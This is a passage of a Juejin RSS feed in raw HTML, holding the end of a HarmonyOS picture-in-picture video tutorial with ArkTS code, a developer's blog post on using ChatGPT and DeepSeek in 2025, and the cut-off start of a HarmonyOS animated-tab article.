<ul>
<li>创建画中画控制器，注册生命周期事件以及控制事件回调</li>
<li>@param ctx 上下文环境
*/
init(ctx: Context) {
if (this.pipController !== null &amp;&amp; this.pipController !== undefined) {
return;
}
// 当前设备如若不支持画中画则退出
if (!PiPWindow.isPiPEnabled()) {
return;
}</li>
</ul>
<p>let config: PiPWindow.PiPConfiguration = {
context: ctx,
// XComponent组件绑定同一个
componentController: this.getXComponentController(),
// 画中画媒体类型枚举，当前使用的视频播放模版
templateType: PiPWindow.PiPTemplateType.VIDEO_PLAY,
};
// 通过create接口创建画中画控制器实例
let promise: Promise&lt;PiPWindow.PiPController&gt; = PiPWindow.create(config);
promise.then((controller: PiPWindow.PiPController) =&gt; {
this.pipController = controller;
// 通过画中画控制器实例的setAutoStartEnabled接口设置是否需要在应用返回桌面时自动启动画中画
this.pipController?.setAutoStartEnabled(true);
// 通过画中画控制器实例的on('stateChange')接口注册生命周期事件回调
this.pipController.on('stateChange', (state: PiPWindow.PiPState, reason: string) =&gt; {
this.onStateChange(state, reason);
});
// 通过画中画控制器实例的on('controlEvent')接口注册控制事件回调
this.pipController.on('controlEvent', (control: PiPWindow.ControlEventParam) =&gt; {
this.onActionEvent(control);
});
}).catch((err: BusinessError) =&gt; {
console.error(<code>Failed to create pip controller. Cause:${err.code}, message:${err.message}</code>);
});
}</p>
</li>
<li>
<p>通过绑定同一个XComponent控制器使得视频页面和悬浮窗页面视频保持统一播放进度。</p>
<p>XComponent({
type: XComponentType.SURFACE,
controller: PipManager.getInstance().getXComponentController()
})
.onLoad(() =&gt; {
// 将surfaceId设置给媒体源
PipManager.getInstance()
.getXComponentController()
.onSurfaceCreated(PipManager.getInstance().getXComponentController().getXComponentSurfaceId())
// 初始化AVPlayer
PipManager.getInstance().player.init(this.url);
})</p>
</li>
<li>
<p>使用@Watch监听AVPlayer的发生变化时，会触发onPlayingChange的回调方法。组件中需要手动控制视频的播放与暂停，因为视频的播放状态是需要根据视频加载进度和手动控制来改变的，所以可以使用@Watch进行监听。</p>
<p>@ObjectLink @Watch("onPlayingChange") player: AVPlayer</p>
<p>onPlayingChange() {
this.player.isPlaying ? this.player.getPlay() : this.player.getPause();
if (this.player.isPlaying === false) {
PipManager.getInstance().setAutoStart(false)
} else {
PipManager.getInstance().setAutoStart(true)
PipManager.getInstance().updatePiPControlStatus()
}
}</p>
</li>
<li>
<p>悬浮窗的从小窗口恢复到原始播放界面以及关闭悬浮窗，需要通过相关生命周期来进行控制视频的播放状态。</p>
<p>// 监听画中画生命周期
onStateChange(state: PiPWindow.PiPState, reason: string) {
switch (state) {
// 表示画中画将要启动
case PiPWindow.PiPState.ABOUT_TO_START:
break;
// 表示画中画已经启动
case PiPWindow.PiPState.STARTED:
// 启动画中画
PipManager.getInstance().player.isPiPWindowLoad = true;
break;
// 表示画中画将要停止
case PiPWindow.PiPState.ABOUT_TO_STOP:
// 画中画关闭
PipManager.getInstance().player.isPiPWindowLoad = false;
break;
// 表示画中画已经停止
case PiPWindow.PiPState.STOPPED:
// 画中画关闭
PipManager.getInstance().player.isPiPWindowLoad = false;
// 小窗口点击关闭画中画，视频暂停播放
if (!PipManager.getInstance().player.isPiPWindowRestore) {
PipManager.getInstance().player.isPlaying = false;
}
PipManager.getInstance().player.isPiPWindowRestore = false;
break;
// 表示画中画将从小窗播放恢复到原始播放界面
case PiPWindow.PiPState.ABOUT_TO_RESTORE:
// 小窗口复原关闭画中画
PipManager.getInstance().player.isPiPWindowLoad = false;
// 从小窗口复原
PipManager.getInstance().player.isPiPWindowRestore = true;
if (!PipManager.getInstance().player.isPlaying) {
PipManager.getInstance().player.isPlaying = true;
}
break;
// 表示画中画生命周期执行过程出现了异常
case PiPWindow.PiPState.ERROR:
break;
default:
break;
}
}</p>
</li>
<li>
<p>因为当悬浮窗的从小窗口恢复到原始播放界面以及关闭悬浮窗时对视频播放状态进行操作，悬浮窗的播放图标并不会实时更新，所以手动进行更新。</p>
<p>/**</p>
<ul>
<li>视频播放页面</li>
<li>@param url:视频源（本案例仅支持使用在线视频）
*/
XComponentView({
url: this.url
})
.gesture(
// 双击视频，视频暂停/播放
GestureGroup(GestureMode.Exclusive,
TapGesture({ count: TAP_GESTURE }).onAction((event?: GestureEvent) =&gt; {
PipManager.getInstance().player.isPlaying = !PipManager.getInstance().player.isPlaying
if (PipManager.getInstance().player.isPlaying === false) {
PipManager.getInstance().setAutoStart(false)
PipManager.getInstance().updatePiPControlStatus()
} else {
PipManager.getInstance().setAutoStart(true)
PipManager.getInstance().updatePiPControlStatus()
}
})
))
// 更新画中画面板控件状态
updatePiPControlStatus() {
let controlType: PiPWindow.PiPControlType = PiPWindow.PiPControlType.VIDEO_PLAY_PAUSE; // 视频播放控制面板中播放/暂停控件。
let status: PiPWindow.PiPControlStatus = PiPWindow.PiPControlStatus.PLAY; // 视频播放控制面板中播放/暂停控件为播放状态。
this.pipController?.updatePiPControlStatus(controlType, status); // 更新控制面板控件功能状态
}</li>
</ul>
</li>
<li>
<p>使用onAreaChange来获取原视频页面的播放区域宽高。</p>
<p>Stack(this.player.isLoading ? { alignContent: Alignment.Center } :
{ alignContent: Alignment.Bottom }) {</p>
<p>/**</p>
<ul>
<li>视频播放组件</li>
<li>url:视频源（本案例仅支持使用在线视频）
*/
XComponentView({
url: this.url
})
...
}
.onAreaChange((oldVal: Area, newVal: Area) =&gt; {
// 获取视频播放区域的宽高
this.videoAreaWidth = newVal.width as number;
this.videoAreaHeight = newVal.height as number;
})</li>
</ul>
</li>
<li>
<p>使用PanGesture来确定手指滑动的方向以及移动的距离从而改变实时改变视频的亮度和声音。</p>
<p>Stack(this.player.isLoading ? { alignContent: Alignment.Center } :
{ alignContent: Alignment.Bottom }) {</p>
<p>/**</p>
<ul>
<li>视频播放组件</li>
<li>url:视频源（本案例仅支持使用在线视频）
*/
XComponentView({
url: this.url
})
...
}
.gesture(
// 双击视频，视频暂停/播放
GestureGroup(GestureMode.Exclusive,
TapGesture({ count: TAP_GESTURE })
.onAction((event?: GestureEvent) =&gt; {
this.player.isPlaying = !this.player.isPlaying;
AppStorage.setOrCreate('pipWindow_isPlaying', this.player.isPlaying);
if (this.player.isPlaying === false) {
PipManager.getInstance().setAutoStart(false);
PipManager.getInstance().updatePiPControlStatus();
} else {
PipManager.getInstance().setAutoStart(true);
PipManager.getInstance().updatePiPControlStatus();
}
}),
PanGesture(this.panOption)
.onActionStart((event: GestureEvent) =&gt; {
this.sysVolumeChange();
this.positionH = event.offsetY;
this.controlShow = true;
})
.onActionUpdate((event: GestureEvent) =&gt; {
this.panOption.setDirection(PanDirection.Vertical);
// 手指初次滑动横向坐标位置
this.fingerPosition = event.fingerList[0].localX;
if (this.positionH === event.offsetY) {
return;
}
// 手指移动的距离
let changeVolume = ((this.positionH - event.offsetY) / this.videoAreaHeight) * HEIGHT_INTEGER;
if (this.fingerPosition &lt; (this.videoAreaWidth / PARTITION)) {
this.onBrightActionUpdate(changeVolume);
// 调节视频亮度
this.mWindow?.setWindowBrightness(this.bright / CONTROLLER_MAX);
} else {
this.onVolumeActionUpdate(changeVolume);
}
this.positionH = event.offsetY;
})
.onActionEnd(() =&gt; {
// 延时隐藏控制器
setTimeout(() =&gt; {
this.controlShow = false;
}, CONTROLLER_DElAY)
})
))</li>
</ul>
</li>
</ol>
<h4 data-id="heading-6">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-7">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ce8fcc243f84647a2963226abfb3c5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623531&amp;x-signature=qViJQl0LopLlJgapc3XNA%2BRXCms%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI工具如何重塑我的开发日常]]></title>    <link>https://juejin.cn/post/7589126920286535690</link>    <guid>https://juejin.cn/post/7589126920286535690</guid>    <pubDate>2025-12-29T14:34:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126920286535690" data-draft-id="7589126920286437386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI工具如何重塑我的开发日常 "/> <meta itemprop="keywords" content="前端,人工智能,深度学习"/> <meta itemprop="datePublished" content="2025-12-29T14:34:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_XU"/> <meta itemprop="url" content="https://juejin.cn/user/3166249063027112"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI工具如何重塑我的开发日常 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3166249063027112/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _XU
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:34:07.000Z" title="Mon Dec 29 2025 14:34:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>2025年，转眼间又过去了。作为一名开发者，这一年来，我最深刻的体会就是大语言模型（LLM）如ChatGPT和DeepSeek，已经从“新鲜玩具”彻底转变为日常工作的核心伙伴。它们不再是偶尔咨询的“搜索引擎替代品”，而是真正融入代码编写、调试和思考流程的“编程搭档”。
聚焦到个体层面，这些AI工具对“我”的影响是巨大的：开发效率显著提升，代码编写变得更流畅、更富有创意，同时也让我重新审视自己的编程习惯和技能成长路径。下面，我从个人经历出发，分享这一年的变化。</p>
<h2 data-id="heading-0">ChatGPT：从灵感激发到高效代码生成的得力助手</h2>
<p>年初时，我主要用ChatGPT来处理日常编码问题。起初只是简单问“怎么实现一个Vue函数”或“优化这个SQL查询”，但渐渐地，它成了我开发流程的起点。</p>
<p><strong>效率提升的核心场景：</strong> 在编写新功能时，ChatGPT帮我快速生成 boilerplate 代码。例如，构建一个后端API时，我只需描述需求（如“用Node.js和Express实现一个带JWT认证的用户注册接口”），它就能输出完整结构，包括错误处理和最佳实践。这让我从重复性工作解放出来，一天能多处理2-3个中等复杂度任务。个人统计下来，今年我的代码提交频率比去年提高了约30%，很大程度上归功于此。</p>
<p><strong>调试的加速器：</strong> 遇到bug时，粘贴错误信息和相关代码，ChatGPT往往能精准指出问题，甚至建议多种修复方案。相比以前先手动搜索再实现验证，现在调试时间缩短了至少一半。有一次，一个棘手的异步并发问题困扰了我半天，用ChatGPT分析后，很快就解决了。</p>
<p><strong>个人影响：</strong> 它让我编码更“如鱼得水”——思路卡壳时，像和一位资深同事 brainstorm 一样顺畅。负面来说，有时生成的代码需要仔细审查（hallucination问题虽减少但仍存在），这培养了我更强的代码审查习惯。总体上，ChatGPT让我从“机械码农”转向“架构思考者”，工作效率明显提升。</p>
<h2 data-id="heading-1">DeepSeek：极致性价比与本地部署的硬核选择</h2>
<p>年中开始，我逐渐把DeepSeek作为主力代码工具，它使用起来很方便以及能很好的控制成本。它的代码生成精度与速度在Vue、Node.js等前端生态上表现不错，而且响应速度也很快。 如果项目涉密注重隐私，DeepSeek开源模型可以部署到本地运行，不上传任何敏感项目代码。</p>
<p><strong>个人影响：</strong> DeepSeek可以满足大量批量生成或重构的场景。它把我从“担心费用”和“担心隐私”的焦虑中解放出来，让我更专注于业务本身。</p>
<h2 data-id="heading-2">我的典型工作流</h2>
<p>实际使用中，两者我形成了清晰的互补策略：</p>
<ul>
<li>创意与需求拆解阶段 → 用ChatGPT（更擅长发散思维）。</li>
<li>核心代码实现与优化阶段 → 切到DeepSeek（更快、更省钱）。</li>
<li>调试与重构阶段 → 根据上下文和隐私需求灵活切换。</li>
</ul>
<h2 data-id="heading-3">个人体会</h2>
<p>大模型的进步让代码生成不再是“填空题”，而是真正智能协作。
<strong>生产力跃升：</strong> 结合使用ChatGPT和DeepSeek，我的整体开发效率得到了大幅提升。重复任务几乎自动化，留出更多时间专注核心逻辑和创新。 <strong>技能演变：</strong> AI处理了低阶工作，我被迫提升prompt工程和系统设计能力。以前写代码靠记忆，现在更靠“问对问题”。这让我成长更快，同时也担心过度依赖会弱化基础技能——所以我坚持不断手动实现一些算法练习。</p>
<p>当然，不是一切完美。AI偶尔也会输出低质代码，需要人工把关。但总体上，2025年的AI工具让我这个开发者感受到前所未有的赋能。 展望2026，随着agentic模式（如多步自主任务）和更好工具集成，我相信开发将更进一步“智能化”。作为开发者，我们不是被取代，而是被放大——抓住这个浪潮，继续游刃有余地在代码的海洋中畅游！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：自定义动效tab实现]]></title>    <link>https://juejin.cn/post/7589099845186863140</link>    <guid>https://juejin.cn/post/7589099845186863140</guid>    <pubDate>2025-12-29T14:35:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845186863140" data-draft-id="7589201772118179846" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：自定义动效tab实现"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:35:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：自定义动效tab实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:35:16.000Z" title="Mon Dec 29 2025 14:35:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid 